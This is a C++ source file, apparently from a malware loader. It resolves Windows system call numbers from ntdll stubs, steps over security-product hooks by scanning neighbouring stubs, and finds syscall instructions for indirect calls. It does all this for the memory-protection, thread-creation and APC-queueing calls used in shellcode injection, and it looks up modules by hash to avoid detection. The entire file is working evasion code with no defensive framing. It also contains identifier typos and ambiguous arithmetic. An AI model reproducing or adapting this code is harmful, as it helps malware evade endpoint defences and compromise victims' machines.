#include "ntdll.h"
#include "k32.h"
#include "hash.h"
#include "syscalls.h"

void* GetSyscallInstruction(void* searchAddr)
{
	for (int i = 0; i < 500; i++)
	{
		if (
			((PBYTE)searchAddr + i)[0] == 0x0F &&
			((PBYTE)searchAddr + i)[1] == 0x05
			)
		{
			return (void*)((PBYTE)searchAddr + i);
		}
	}
	return nullptr;
}

bool GetSyscall(void* pFunctionAddress, PSYSCALL syscall)
{
	if (*((PBYTE)pFunctionAddress) == 0x4c
		&& *((PBYTE)pFunctionAddress + 1) == 0x8b
		&& *((PBYTE)pFunctionAddress + 2) == 0xd1
		&& *((PBYTE)pFunctionAddress + 3) == 0xb8
		&& *((PBYTE)pFunctionAddress + 6) == 0x00
		&& *((PBYTE)pFunctionAddress + 7) == 0x00) {

		BYTE high = *((PBYTE)pFunctionAddress + 5);
		BYTE low = *((PBYTE)pFunctionAddress + 4);
		syscall->ssn = (high << 8) | low;
		syscall->syscallAddr = GetSyscallInstruction(pFunctionAddress);
		return true;
	}
	else {
		for (WORD idx = 1; idx <= 500; idx++) {
			if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
				&& *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
				&& *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xd1
				&& *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xb8
				&& *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00
				&& *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00) {
				BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
				BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
				syscall->ssn = (high << 8) | low - idx;
				syscall->syscallAddr = GetSyscallInstruction((PBYTE)pFunctionAddress + idx * DOWN);

				return true;
			}
			if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
				&& *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
				&& *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xd1
				&& *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xb8
				&& *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00
				&& *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00) {
				BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
				BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
				syscall->ssn = (high << 8) | low + idx;
				syscall->syscallAddr = GetSyscallInstruction((PBYTE)pFunctionAddress + idx * UP);

				return true;
			}
		}
		return false;
	}
	
	return false;
}


bool InitSyscallList(PFUNCTION_LIST funcList)
{
	void* pNtdll = xGetModuleHandleA(HASH_NTDLL);

	if (!
		GetSyscall(xGetProcAddress(pNtdll, HASH_NTPROTECTVIRTUALMEMORY), &funcList->NtProtectVirtualMemory)
		)
	{
		return false;
	}

	if (!
		GetSyscall(xGetProcAddress(pNtdll, HASH_NTWAITFORSINGLEOBJECT), &funcList->NtWaitForSingleObject)
		)
	{
		return false;
	}

	if (!
		GetSyscall(xGetProcAddress(pNtdll, HASH_NTCREATETHREADEX), &funcList->NtCreateThreadEx)
		)
	{
		return false;
	}

	if (!
		GetSyscall(xGetProcAddress(pNtdll, HASH_NTQUEUEUCAPCTHREAD), &funcList->NtQueueApcThread)
		)
	{
		return false;
	}

	if (!
		GetSyscall(xGetProcAddress(pNtdll, HAHS_NTRESUMETHREAD), &funcList->NtResumeThread)
		)
	{
		return false;
	}

	if (!
		GetSyscall(xGetProcAddress(pNtdll, HASH_NTCLOSE), &funcList->NtClose)
		)
	{
		return false;
	}

	if (!
		GetSyscall(xGetProcAddress(pNtdll, HASH_NTTERMINATETHREAD), &funcList->NtTerminateThread)
		)
	{
		return false;
	}

	return true;
}
